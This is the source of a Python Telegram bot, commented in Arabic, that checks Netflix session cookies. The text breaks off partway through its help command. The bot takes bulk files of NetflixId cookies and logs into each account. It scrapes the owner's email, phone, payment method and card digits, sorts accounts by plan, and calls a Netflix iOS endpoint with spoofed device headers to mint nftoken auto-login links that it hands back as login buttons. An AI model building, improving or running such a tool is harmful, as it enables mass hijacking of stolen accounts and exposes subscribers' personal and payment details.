# bot.py - نسخة Railway (بتقرأ كل الكوكيز في الملف)
import os
import re
import json
import zipfile
import html
import time
from datetime import datetime
from io import BytesIO

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ======================== توكن البوت ========================
BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    print("❌ ERROR: BOT_TOKEN not found!")
    exit(1)

# ======================== الإعدادات ========================
REQUEST_TIMEOUT = 30

# ======================== دوال NFToken ========================
def create_nftoken_link(netflix_id):
    if not netflix_id:
        return None
    
    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    
    params = {
        "appVersion": "15.48.1",
        "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"false","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        "device_type": "NFAPPL-02-",
        "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "idiom": "phone",
        "iosVersion": "15.8.5",
        "isTablet": "false",
        "languages": "en-US",
        "locale": "en-US",
        "maxDeviceWidth": "375",
        "model": "saget",
        "modelType": "IPHONE8-1",
        "odpAware": "true",
        "path": '["account","token","default"]',
        "pathFormat": "graph",
        "pixelDensity": "2.0",
        "progressive": "false",
        "responseFormat": "json",
    }
    
    headers = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "x-netflix.request.attempt": "1",
        "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.context.app-version": "15.48.1",
        "x-netflix.argo.translated": "true",
        "x-netflix.context.form-factor": "phone",
        "x-netflix.context.sdk-version": "2012.4",
        "x-netflix.client.appversion": "15.48.1",
        "x-netflix.context.max-device-width": "375",
        "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        "x-netflix.client.type": "argo",
        "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "x-netflix.context.locales": "en-US",
        "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.client.iosversion": "15.8.5",
        "accept-language": "en-US;q=1",
        "x-netflix.argo.abtests": "",
        "x-netflix.context.os-version": "15.8.5",
        "x-netflix.request.client.context": '{"appState":"foreground"}',
        "x-netflix.context.ui-flavor": "argo",
        "x-netflix.argo.nfnsm": "9",
        "x-netflix.context.pixel-density": "2.0",
        "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.request.client.timezoneid": "Asia/Dhaka",
        "Cookie": f"NetflixId={netflix_id}",
    }
    
    try:
        response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
        
        if response.status_code == 200:
            data = response.json()
            token = None
            try:
                token = data.get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token")
            except:
                pass
            
            if token:
                return token
        return None
    except Exception:
        return None

def create_pc_link(token):
    if not token:
        return None
    return f"https://netflix.com/?nftoken={token}"

def create_mobile_link(token):
    if not token:
        return None
    return f"https://netflix.com/unsupported?nftoken={token}"

# ======================== دوال الفحص الأساسية ========================
def decode_value(value):
    if value is None:
        return None
    cleaned = html.unescape(str(value))
    cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
    cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned or None

def country_to_flag(code):
    if not code:
        return ""
    code = code.strip().upper()
    if len(code) == 2 and code.isalpha():
        return "".join(chr(127397 + ord(ch)) for ch in code)
    return ""

def format_date(value):
    if not value:
        return "Unknown"
    for fmt in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
        try:
            return datetime.strptime(value[:19], fmt).strftime("%B %d, %Y")
        except:
            pass
    return value

def parse_member_since(value):
    if not value:
        return "Unknown"
    
    value = decode_value(value) or value
    value_lower = value.lower()
    
    months = {
        'january': 'January', 'januar': 'January', 'enero': 'January', 'janvier': 'January', 'janeiro': 'January',
        'february': 'February', 'februar': 'February', 'febrero': 'February', 'fevrier': 'February', 'fevereiro': 'February',
        'march': 'March', 'marz': 'March', 'marzo': 'March', 'mars': 'March', 'marco': 'March',
        'april': 'April', 'april': 'April', 'abril': 'April', 'avril': 'April', 'abrile': 'April',
        'may': 'May', 'mai': 'May', 'mayo': 'May', 'maio': 'May',
        'june': 'June', 'juni': 'June', 'junio': 'June', 'juin': 'June', 'junho': 'June',
        'july': 'July', 'juli': 'July', 'julio': 'July', 'juillet': 'July', 'julho': 'July',
        'august': 'August', 'august': 'August', 'agosto': 'August', 'aout': 'August', 'agost': 'August',
        'september': 'September', 'september': 'September', 'septiembre': 'September', 'septembre': 'September', 'setembro': 'September',
        'october': 'October', 'oktober': 'October', 'octubre': 'October', 'octobre': 'October', 'outubro': 'October',
        'november': 'November', 'november': 'November', 'noviembre': 'November', 'novembre': 'November', 'novembro': 'November',
        'december': 'December', 'dezember': 'December', 'diciembre': 'December', 'decembre': 'December', 'dezembro': 'December',
        'jan': 'January', 'feb': 'February', 'mar': 'March', 'apr': 'April', 'may': 'May', 'jun': 'June',
        'jul': 'July', 'aug': 'August', 'sep': 'September', 'oct': 'October', 'nov': 'November', 'dec': 'December',
    }
    
    for mon_key, mon_name in months.items():
        if mon_key in value_lower:
            year_match = re.search(r'(19|20)\d{2}', value)
            if year_match:
                year = year_match.group()
                return f"{mon_name} {year}"
            return mon_name
    
    numbers = re.findall(r'\d+', value)
    if len(numbers) >= 2:
        possible_month = int(numbers[0]) if int(numbers[0]) <= 12 else None
        possible_year = numbers[-1]
        if possible_month and len(possible_year) == 4:
            months_list = ['January', 'February', 'March', 'April', 'May', 'June', 
                          'July', 'August', 'September', 'October', 'November', 'December']
            return f"{months_list[possible_month-1]} {possible_year}"
    
    return value

def format_member_since(value):
    return parse_member_since(value) if value else "Unknown"

def format_membership_status(status):
    if not status:
        return "Active"
    status_lower = status.lower()
    if "current_member" in status_lower:
        return "Active"
    elif "cancelled" in status_lower:
        return "Cancelled"
    elif "expired" in status_lower:
        return "Expired"
    elif "on_hold" in status_lower:
        return "On Hold"
    elif "past_due" in status_lower:
        return "Past Due"
    else:
        return status.title()

# ======================== دوال استخراج الكوكيز (المعدلة) ========================
def extract_all_cookies_from_file(content):
    """استخراج جميع الكوكيز من النص - يقرأ كل الكوكيز في الملف"""
    accounts = []
    
    if not content or not content.strip():
        return accounts
    
    # ============================================================
    # الطريقة 1: البحث عن كل NetflixId في النص (للتنسيق البسيط)
    # ============================================================
    pattern = r'NetflixId[=\t\s]+([^\s\n\t;]+)'
    all_matches = list(re.finditer(pattern, content))
    
    for match in all_matches:
        cookies = {}
        nf_value = match.group(1).strip('"')
        
        # منع التكرار
        if any(acc['cookies'].get('NetflixId') == nf_value for acc in accounts):
            continue
            
        cookies['NetflixId'] = nf_value
        
        # البحث عن SecureNetflixId في نفس المنطقة
        start = match.start()
        end = min(start + 500, len(content))
        nearby_text = content[start:end]
        
        snf_pattern = r'SecureNetflixId[=\t\s]+([^\s\n\t;]+)'
        snf_match = re.search(snf_pattern, nearby_text)
        if snf_match:
            cookies['SecureNetflixId'] = snf_match.group(1).strip('"')
        
        accounts.append({"cookies": cookies, "raw": f"account_{len(accounts)+1}"})
    
    # ============================================================
    # الطريقة 2: تنسيق Netscape (لو الطريقة الأولى مجابتش حاجة)
    # ============================================================
    if not accounts:
        netscape_cookies = {}
        lines = content.split('\n')
        
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            
            parts = line.split('\t')
            if len(parts) >= 7:
                name = parts[5]
                value = parts[6]
                
                if name == 'NetflixId':
                    netscape_cookies['NetflixId'] = value
                elif name == 'SecureNetflixId':
                    netscape_cookies['SecureNetflixId'] = value
        
        if netscape_cookies.get('NetflixId'):
            accounts.append({"cookies": netscape_cookies, "raw": "netscape_format"})
    
    # ============================================================
    # الطريقة 3: تقسيم النص على أساس NetflixId (للتنسيق المتعدد)
    # ============================================================
    if not accounts:
        parts = re.split(r'(?=NetflixId[=\t])', content)
        
        for part in parts:
            if not part.strip():
                continue
            
            cookies = {}
            
            nf_match = re.search(r'NetflixId[=\t]+([^\s\n\t;]+)', part)
            if nf_match:
                cookies["NetflixId"] = nf_match.group(1).strip('"')
            
            snf_match = re.search(r'SecureNetflixId[=\t]+([^\s\n\t;]+)', part)
            if snf_match:
                cookies["SecureNetflixId"] = snf_match.group(1).strip('"')
            
            if cookies.get("NetflixId"):
                if not any(acc['cookies'].get('NetflixId') == cookies['NetflixId'] for acc in accounts):
                    accounts.append({"cookies": cookies, "raw": part[:200]})
    
    return accounts

# ======================== دوال استخراج طريقة الدفع ========================
def extract_payment_method(html_content):
    payment_methods = []
    
    payment_match = re.search(r'"paymentMethod"\s*:\s*"([^"]+)"', html_content)
    if payment_match:
        method = decode_value(payment_match.group(1))
        if method and method not in payment_methods:
            payment_methods.append(method)
    
    payment_match = re.search(r'"paymentMethodType"\s*:\s*"([^"]+)"', html_content)
    if payment_match:
        method = decode_value(payment_match.group(1))
        if method and method not in payment_methods:
            payment_methods.append(method)
    
    billing_patterns = [
        r'<span[^>]*class="[^"]*payment[^"]*"[^>]*>([^<]+)</span>',
        r'<div[^>]*class="[^"]*payment-method[^"]*"[^>]*>([^<]+)</div>',
        r'<div[^>]*data-uia="payment-method"[^>]*>([^<]+)</div>',
        r'<span[^>]*data-uia="payment-method-label"[^>]*>([^<]+)</span>',
        r'ending in[^\d]*(\d{4})',
        r'(Visa|Mastercard|American Express|Amex|Discover|PayPal|Gift Card|Mobile Billing|Direct Debit|Prepaid Card)[^<]*',
        r'Credit/Debit Card.*?ending in[^\d]*(\d{4})',
    ]
    
    for pattern in billing_patterns:
        match = re.search(pattern, html_content, re.IGNORECASE)
        if match:
            if len(match.groups()) > 0 and match.group(1):
                method = decode_value(match.group(1))
            else:
                method = decode_value(match.group(0))
            
            if method and method not in payment_methods and len(method) > 2 and len(method) < 100:
                if 'ending in' in method.lower() or method.isdigit():
                    card_match = re.search(r'ending in[^\d]*(\d{4})', method, re.IGNORECASE)
                    if card_match:
                        method = f"Card ending in {card_match.group(1)}"
                payment_methods.append(method[:50])
    
    js_patterns = [
        r'paymentMethodDisplayName["\']?\s*:\s*["\']([^"\']+)',
        r'payment_info["\']?\s*:\s*{[^}]*method["\']?\s*:\s*["\']([^"\']+)',
        r'billingInfo["\']?\s*:\s*{[^}]*paymentType["\']?\s*:\s*["\']([^"\']+)',
        r'currentPaymentMethod["\']?\s*:\s*["\']([^"\']+)',
    ]
    
    for pattern in js_patterns:
        match = re.search(pattern, html_content, re.IGNORECASE)
        if match:
            method = decode_value(match.group(1))
            if method and method not in payment_methods and len(method) < 100:
                payment_methods.append(method)
    
    known_methods = ['PayPal', 'Visa', 'Mastercard', 'American Express', 'Amex', 'Discover', 
                     'Gift Card', 'Mobile', 'Direct Debit', 'Prepaid', 'iTunes', 'Google Play',
                     'Bank Transfer', 'Sofort', 'IDEAL', 'Giropay']
    
    for method in known_methods:
        if re.search(r'\b' + re.escape(method) + r'\b', html_content, re.IGNORECASE):
            if method not in payment_methods:
                payment_methods.append(method)
    
    last_four_match = re.search(r'(\d{4})[^\d]*$', html_content)
    if last_four_match and not payment_methods:
        payment_methods.append(f"Card ending in {last_four_match.group(1)}")
    
    for method in payment_methods:
        if method and len(method) > 1:
            return method
    
    return None

# ======================== دوال استخراج البروفايلات ========================
def extract_all_profiles_from_manage(session, headers):
    profiles = []
    
    forbidden_names = [
        'add profile', 'add', 'اضافة', 'إضافة', 'اضافة بروفايل', 'إضافة بروفايل',
        'new profile', 'create profile', 'اضف بروفايل', 'add new', 'addnew',
        'اضف', 'profile add', 'plus', '+', 'اضافة ملف', 'انشاء', 'create',
        'add profile', 'add a profile', 'new', 'make a profile'
    ]
    
    try:
        resp = session.get("https://www.netflix.com/ManageProfiles", headers=headers, timeout=REQUEST_TIMEOUT)
        
        if resp.status_code != 200:
            return profiles
        
        html_content = resp.text
        
        profiles_match = re.search(r'"profiles"\s*:\s*\[(.*?)\](?=\s*[,\}])', html_content, re.DOTALL)
        if profiles_match:
            profiles_data = profiles_match.group(1)
            all_names = re.findall(r'"name"\s*:\s*"([^"]+)"', profiles_data)
            for name in all_names:
                decoded = decode_value(name)
                if decoded:
                    name_lower = decoded.lower().strip()
                    is_forbidden = any(forbidden in name_lower for forbidden in forbidden_names)
                    if not is_forbidden and decoded not in profiles and len(decoded) >= 1:
                        profiles.append(decoded)
        
        profile_matches = re.finditer(r'"profileName"\s*:\s*"([^"]+)"', html_content)
        for match in profile_matches:
            pname = decode_value(match.group(1))
            if pname:
                name_lower = pname.lower().strip()
                is_forbidden = any(forbidden in name_lower for forbidden in forbidden_names)
                if not is_forbidden and pname not in profiles and len(pname) >= 1:
                    profiles.append(pname)
        
        profile_classes = [
            r'<span[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</span>',
            r'<div[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</div>',
            r'<a[^>]*class="[^"]*profile-link[^"]*"[^>]*>([^<]+)</a>',
            r'<div[^>]*data-profile-name[^>]*>([^<]+)</div>',
            r'<span[^>]*data-uia="profile-name"[^>]*>([^<]+)</span>',
            r'<div[^>]*aria-label="Profile[^"]*"[^>]*>([^<]+)</div>',
        ]
        
        for pattern in profile_classes:
            matches = re.finditer(pattern, html_content, re.IGNORECASE)
            for match in matches:
                pname = decode_value(match.group(1))
                if pname:
                    name_lower = pname.lower().strip()
                    is_forbidden = any(forbidden in name_lower for forbidden in forbidden_names)
                    if not is_forbidden and pname not in profiles and len(pname) >= 1:
                        profiles.append(pname)
        
        profiles = list(dict.fromkeys(profiles))
        profiles = [p for p in profiles if p and len(p) >= 1 and p.lower() not in forbidden_names]
        
    except Exception as e:
        pass
    
    return profiles

def get_account_info(cookies):
    if not cookies or "NetflixId" not in cookies:
        return None, "Missing NetflixId"
    
    session = requests.Session()
    session.cookies.set("NetflixId", cookies["NetflixId"], domain=".netflix.com", path="/")
    if "SecureNetflixId" in cookies:
        session.cookies.set("SecureNetflixId", cookies["SecureNetflixId"], domain=".netflix.com", path="/", secure=True)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    
    try:
        resp = session.get("https://www.netflix.com/YourAccount", headers=headers, timeout=REQUEST_TIMEOUT, allow_redirects=True)
        
        if resp.status_code == 200:
            html_content = resp.text
            
            if "logout" not in html_content.lower() and "signin" in html_content.lower():
                return None, "Not logged in - cookie expired"
            
            info = {}
            
            name_match = re.search(r'"firstName"\s*:\s*"([^"]+)"', html_content)
            if name_match:
                info["name"] = decode_value(name_match.group(1))
            else:
                name_match = re.search(r'"name"\s*:\s*"([^"]+)"', html_content)
                if name_match:
                    info["name"] = decode_value(name_match.group(1))
            
            email = None
            email_match = re.search(r'"email"\s*:\s*"([^"]+)"', html_content)
            if email_match:
                email = decode_value(email_match.group(1))
            if not email:
                email_match = re.search(r'"loginId"\s*:\s*"([^"]+)"', html_content)
                if email_match:
                    email = decode_value(email_match.group(1))
            if not email:
                email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', html_content)
                if email_match:
                    email = decode_value(email_match.group(1))
            if not email:
                email_match = re.search(r'<span[^>]*class="[^"]*email[^"]*"[^>]*>([^<]+)</span>', html_content, re.IGNORECASE)
                if email_match:
                    email = decode_value(email_match.group(1))
            info["email"] = email
            
            country_match = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', html_content)
            if not country_match:
                country_match = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', html_content)
            if country_match:
                info["country"] = decode_value(country_match.group(1))
            
            lang_match = re.search(r'"language"\s*:\s*"([^"]+)"', html_content)
            if lang_match:
                info["language"] = decode_value(lang_match.group(1))
            
            member_match = re.search(r'"memberSince"\s*:\s*"([^"]+)"', html_content)
            if member_match:
                info["memberSince"] = decode_value(member_match.group(1))
            
            billing_match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', html_content)
            if billing_match:
                info["nextBilling"] = decode_value(billing_match.group(1))
            else:
                billing_match = re.search(r'"nextBillingDate":\s*{[^}]*"date"\s*:\s*"([^"]+)"', html_content)
                if billing_match:
                    info["nextBilling"] = decode_value(billing_match.group(1))
            
            payment_method = extract_payment_method(html_content)
            if payment_method:
                info["payment"] = payment_method
            else:
                payment_match = re.search(r'"paymentMethod"\s*:\s*"([^"]+)"', html_content)
                if payment_match:
                    info["payment"] = decode_value(payment_match.group(1))
            
            phone_match = re.search(r'"phoneNumber"\s*:\s*"([^"]+)"', html_content)
            if phone_match:
                info["phone"] = decode_value(phone_match.group(1))
            
            phone_verified_match = re.search(r'"phoneVerified"\s*:\s*(true|false)', html_content, re.IGNORECASE)
            if phone_verified_match:
                info["phone_verified"] = "Verified" if phone_verified_match.group(1).lower() == "true" else "Not Verified"
            
            streams_match = re.search(r'"maxStreams"\s*:\s*([0-9]+)', html_content)
            if streams_match:
                info["streams"] = streams_match.group(1)
            
            hold_match = re.search(r'"holdStatus"\s*:\s*(true|false)', html_content, re.IGNORECASE)
            info["hold"] = "Yes" if hold_match and hold_match.group(1).lower() == "true" else "No"
            
            extra_match = re.search(r'"showExtraMemberSection"\s*:\s*(true|false)', html_content, re.IGNORECASE)
            info["extra_member"] = "Yes" if extra_match and extra_match.group(1).lower() == "true" else "No"
            
            email_verified_match = re.search(r'"emailVerified"\s*:\s*(true|false)', html_content, re.IGNORECASE)
            info["email_verified"] = "Yes" if email_verified_match and email_verified_match.group(1).lower() == "true" else "No"
            
            status_match = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html_content)
            if status_match:
                raw_status = decode_value(status_match.group(1))
                info["status"] = format_membership_status(raw_status)
            else:
                info["status"] = "Active"
            
            plan_match = re.search(r'"planName"\s*:\s*"([^"]+)"', html_content)
            if not plan_match:
                plan_match = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', html_content)
            if plan_match:
                info["plan"] = decode_value(plan_match.group(1))
            
            quality_match = re.search(r'"videoQuality"\s*:\s*"([^"]+)"', html_content)
            if quality_match:
                info["quality"] = decode_value(quality_match.group(1))
            
            profiles = extract_all_profiles_from_manage(session, headers)
            
            if profiles:
                info["profiles"] = profiles
                info["profiles_count"] = len(profiles)
                info["profiles_list"] = ", ".join(profiles)
            else:
                info["profiles"] = []
                info["profiles_count"] = 0
                info["profiles_list"] = "No profiles found"
            
            return info, None
        
        return None, f"HTTP {resp.status_code}"
            
    except Exception as e:
        return None, str(e)[:50]

def determine_plan(info):
    if not info:
        return "invalid", "Invalid", False
    
    plan_name = (info.get("plan") or "").lower()
    status = (info.get("status") or "").lower()
    quality = (info.get("quality") or "").lower()
    streams = info.get("streams", "")
    
    is_subscribed = False
    
    if "active" in status or "current_member" in status:
        is_subscribed = True
    elif "premium" in plan_name or "standard" in plan_name or "basic" in plan_name or "mobile" in plan_name:
        is_subscribed = True
    elif streams and streams.isdigit() and int(streams) > 0:
        is_subscribed = True
    
    if not is_subscribed:
        return "free", "Free", False
    
    if "premium" in plan_name:
        return "premium", "Premium", True
    elif "standard" in plan_name:
        if "ads" in plan_name:
            return "standard_with_ads", "Standard With Ads", True
        return "standard", "Standard", True
    elif "basic" in plan_name:
        return "basic", "Basic", True
    elif "mobile" in plan_name:
        return "mobile", "Mobile", True
    
    if "uhd" in quality or "4k" in quality:
        return "premium", "Premium", True
    elif "hd" in quality:
        return "standard", "Standard", True
    
    if streams and streams.isdigit():
        s = int(streams)
        if s >= 4:
            return "premium", "Premium", True
        elif s >= 2:
            return "standard", "Standard", True
        elif s == 1:
            return "basic", "Basic", True
    
    return "unknown", "Unknown", True

# ======================== دالة تنسيق النتيجة للشات ========================
def format_account_details_for_chat(info, pc_link=None, mobile_link=None):
    if not info:
        return None, None
    
    plan_key, plan_display, is_paid = determine_plan(info)
    
    if not is_paid:
        return None, None
    
    lines = []
    
    if plan_key == "premium":
        lines.append("🌟 PREMIUM ACCOUNT 🌟")
    elif plan_key == "standard":
        lines.append("📺 STANDARD ACCOUNT 📺")
    elif plan_key == "basic":
        lines.append("🔰 BASIC ACCOUNT 🔰")
    elif plan_key == "mobile":
        lines.append("📱 MOBILE ACCOUNT 📱")
    else:
        lines.append("🎬 NETFLIX ACCOUNT 🎬")
    
    lines.append("")
    lines.append("✅ Status: Valid Paid Account")
    lines.append("")
    lines.append("👤 Account Details:")
    lines.append("")
    
    lines.append(f"   👤 Name: {info.get('name', 'Unknown')}")
    
    email = info.get('email')
    if email and email != 'Unknown' and email != 'None':
        lines.append(f"   📧 Email: {email}")
    
    country = info.get('country', 'Unknown')
    flag = country_to_flag(country)
    lines.append(f"   🌍 Country: {country} {flag}")
    
    lines.append(f"   📦 Plan: {plan_display}")
    
    member_since = info.get('memberSince')
    if member_since:
        formatted = format_member_since(member_since)
        if formatted and formatted != 'Unknown':
            lines.append(f"   📅 Member Since: {formatted}")
    
    next_billing = info.get('nextBilling')
    if next_billing:
        formatted_billing = format_date(next_billing)
        if formatted_billing and formatted_billing != 'Unknown':
            lines.append(f"   ⏰ Next Billing: {formatted_billing}")
    
    if info.get('payment'):
        lines.append(f"   💳 Payment: {info.get('payment')}")
    
    if info.get('phone'):
        phone_verified = info.get('phone_verified', '')
        check = "✅" if phone_verified == "Verified" else "❌"
        lines.append(f"   📱 Phone: {info.get('phone')} ({check})")
    
    if info.get('streams'):
        lines.append(f"   📺 Streams: {info.get('streams')}")
    
    lines.append(f"   ⏸️ Hold: {info.get('hold', 'No')}")
    lines.append(f"   👥 Extra Member: {info.get('extra_member', 'No')}")
    lines.append(f"   ✅ Email Verified: {info.get('email_verified', 'No')}")
    lines.append(f"   🛡️ Status: {info.get('status', 'Active')}")
    
    lines.append("")
    lines.append("👥 Profiles:")
    lines.append("")
    
    if info.get('profiles_count') and info.get('profiles_count') > 0:
        lines.append(f"   👥 Total: {info.get('profiles_count')}")
        profiles_list = info.get('profiles_list', 'Unknown')
        if len(profiles_list) > 50:
            profiles_list = profiles_list[:47] + "..."
        lines.append(f"   📝 List: {profiles_list}")
    else:
        lines.append("   No profiles found")
    
    text = "\n".join(lines)
    
    keyboard = None
    if pc_link and mobile_link:
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("💻 PC Login", url=pc_link),
                InlineKeyboardButton("📱 Mobile Login", url=mobile_link)
            ]
        ])
    
    return text, keyboard

# ======================== دالة تنسيق النتيجة للملفات ========================
def format_account_details_for_file(info, pc_link=None):
    if not info:
        return None
    
    plan_key, plan_display, is_paid = determine_plan(info)
    
    if not is_paid:
        return None
    
    details = []
    
    details.append("ACCOUNT DETAILS")
    details.append("-" * 40)
    details.append(f"👤 Name: {info.get('name', 'Unknown')}")
    
    email = info.get('email')
    if email and email != 'Unknown' and email != 'None':
        details.append(f"📧 Email: {email}")
    
    country = info.get('country', 'Unknown')
    flag = country_to_flag(country)
    details.append(f"🌍 Country: {country} {flag}")
    
    if info.get('language'):
        details.append(f"🔤 Language: {info.get('language')}")
    
    details.append(f"📦 Plan: {plan_display}")
    
    member_since = info.get('memberSince')
    if member_since:
        formatted = format_member_since(member_since)
        if formatted and formatted != 'Unknown':
            details.append(f"📅 Member Since: {formatted}")
    
    next_billing = info.get('nextBilling')
    if next_billing:
        formatted_billing = format_date(next_billing)
        if formatted_billing and formatted_billing != 'Unknown':
            details.append(f"⏰ Expiry Date: {formatted_billing}")
    
    if info.get('payment'):
        details.append(f"💳 Payment: {info.get('payment')}")
    
    if info.get('phone'):
        phone_verified = info.get('phone_verified', '')
        details.append(f"📱 Phone: {info.get('phone')} ({phone_verified})" if phone_verified else f"📱 Phone: {info.get('phone')}")
    
    if info.get('streams'):
        details.append(f"📺 Streams: {info.get('streams')}")
    
    details.append(f"⏸️ Hold Status: {info.get('hold', 'No')}")
    details.append(f"👥 Extra Member: {info.get('extra_member', 'No')}")
    details.append(f"✅ Email Verified: {info.get('email_verified', 'No')}")
    details.append(f"🛡️ Membership Status: {info.get('status', 'Active')}")
    
    details.append("")
    details.append("PROFILES")
    details.append("-" * 40)
    
    if info.get('profiles_count') and info.get('profiles_count') > 0:
        details.append(f"👥 Total Profiles: {info.get('profiles_count')}")
        details.append(f"📝 Profiles List: {info.get('profiles_list', 'Unknown')}")
    else:
        details.append("No profiles found")
    
    if pc_link:
        details.append("")
        details.append("NFTOKEN LOGIN LINKS")
        details.append("-" * 40)
        details.append(f"PC Login:\n{pc_link}")
    else:
        details.append("")
        details.append("NFTOKEN LOGIN LINKS")
        details.append("-" * 40)
        details.append("PC Login: FAILED - Could not generate token")
    
    return "\n".join(details)

# ======================== البوت ========================
checking = False
results = {}
total_accounts = 0
processed = 0
chat_id = None
msg_id = None
stop_flag = False

async def update_progress(context):
    global processed, total_accounts, chat_id, msg_id, checking
    if not checking or not chat_id:
        return
    
    percent = int((processed / total_accounts) * 100) if total_accounts > 0 else 0
    bar_len = 20
    filled = int(bar_len * processed / total_accounts) if total_accounts > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    
    premium = sum(1 for r in results.values() if r.get("plan_key") == "premium")
    standard = sum(1 for r in results.values() if r.get("plan_key") in ["standard", "standard_with_ads"])
    basic = sum(1 for r in results.values() if r.get("plan_key") == "basic")
    mobile = sum(1 for r in results.values() if r.get("plan_key") == "mobile")
    invalid = sum(1 for r in results.values() if r.get("plan_key") == "invalid")
    
    text = (
        f"🔄 Processing Started\n\n"
        f"📁 Total Cookies: {total_accounts}\n"
        f"⚙️ Mode: Fullinfo\n"
        f"🔧 Threads: 25 parallel\n\n"
        f"📊 Status:\n"
        f"   ├─ Processing: {processed}/{total_accounts}\n"
        f"   ├─ 💎 Premium: {premium}\n"
        f"   ├─ 📺 Standard: {standard}\n"
        f"   ├─ 🔰 Basic: {basic}\n"
        f"   ├─ 📱 Mobile: {mobile}\n"
        f"   └─ ❌ Invalid: {invalid}\n\n"
        f"{bar} {percent}%\n\n"
        f"⚠️ Use /cancel to stop this task"
    )
    
    try:
        await context.bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id)
    except:
        pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    name = user.first_name or "User"
    
    text = (
        f"🎬 Netflix Cookies Checker Bot\n"
        f"👨‍💻 Developer: Eyad 🐼\n\n"
        f"✨ Welcome {name}! ✨\n\n"
        f"📌 WHAT I DO:\n"
        f"   ├─ Verify Netflix cookies\n"
        f"   └─ Extract premium account details\n\n"
        f"📖 HOW TO USE:\n"
        f"   1️⃣ Export cookies (.txt or .json)\n"
        f"   2️⃣ Send files directly (single or ZIP)\n"
        f"   3️⃣ OR send cookies as text message 📝\n"
        f"   4️⃣ Watch progress bar\n"
        f"   5️⃣ Receive results with PC & Mobile buttons\n\n"
        f"✅ Supported Cookie Formats:\n"
        f"   ├─ Netscape format (*.txt files)\n"
        f"   ├─ Simple format (NetflixId=value)\n"
        f"   ├─ JSON format\n"
        f"   └─ ZIP archives\n\n"
        f"⚙️ COMMANDS:\n"
        f"   ├─ /start → Show menu\n"
        f"   ├─ /help → Instructions\n"
        f"   ├─ /stats → Statistics\n"
        f"   └─ /cancel → Stop task\n\n"
        f"📁 Send cookies file or paste cookies text to start"
    )
    
    await update.message.reply_text(text)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        f"📖 HOW TO USE:\n\n"
        f"طريقة 1 - إرسال ملف:\n"
        f"   1️⃣ Export Netflix cookies using browser extension\n"
        f"   2️⃣ Save as .txt format\n"
        f"   3️⃣ Send file directly to bot\n\n"
        f"طريقة 2 - إرسال نص:\n"
        f"   1️⃣ انسخ الكوكيز بأي شكل\n"
        f"   2️⃣ الصق النص في الشات وأرسله\n"
        f"   3️⃣ البوت سيتعرف عليه تلقائياً\n\n"
